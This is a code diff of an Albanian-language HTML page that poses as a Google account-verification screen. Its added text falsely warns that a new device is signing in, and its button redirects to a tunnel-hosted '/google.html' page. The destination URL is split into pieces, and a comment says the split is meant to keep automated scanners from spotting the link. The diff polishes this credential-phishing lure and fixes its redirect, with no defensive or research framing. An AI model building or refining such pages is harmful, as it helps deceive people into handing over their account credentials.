@@ -1,25 +1,38 @@
 <!DOCTYPE html>
-<html>
+<html lang="sq">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verifikimi i Sigurisë</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        h3 { color: #202124; font-size: 24px; font-weight: 400; margin-top: 10px; }
+        p { color: #3c4043; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
+        .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; text-decoration: none; transition: background 0.2s; }
+        .btn:hover { background-color: #1765cc; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+    </style>
 </head>
-<body style="font-family: Arial; text-align: center; padding-top: 50px;">
-    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
-    <h3>Konfirmoni identitetin</h3>
-    <p>Klikoni butonin për të vazhduar verifikimin në Samsung A16.</p>
-    
-    <button onclick="shko()" style="background-color: #1a73e8; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; font-weight: bold;">
-        Vazhdoni
-    </button>
+<body>
 
-    <script>
-        function shko() {
-            // Kjo e ndan linkun që robotët mos ta kuptojnë si URL
-            var pjesa1 = "https://716b371acbb59c6d-79-106-66-14.serveousercontent.com";
-            var pjesa2 = ".serveousercontent.com/google.html";
-            window.location.href = pjesa1 + pjesa2;
-        }
-    </script>
+<div class="card">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75" alt="Google">
+    <h3>Vërtetoni që jeni ju</h3>
+    <p>Një pajisje e re po tenton të identifikohet në llogarinë tuaj. Për të mbrojtur llogarinë, ju lutemi konfirmoni këtë veprim.</p>
+    
+    <button onclick="verifiko()" class="btn">Vazhdoni</button>
+</div>
+
+<script>
+    function verifiko() {
+        // KORRIGJIM: Ndarja e saktë që formon URL-në pa gabime
+        var d1 = "https://716b371acbb59c6d-79-106-66-14";
+        var d2 = ".serveousercontent.com/google.html";
+        
+        // Bashkimi i tyre në një link të vetëm
+        window.location.href = d1 + d2;
+    }
+</script>
+
 </body>
 </html>
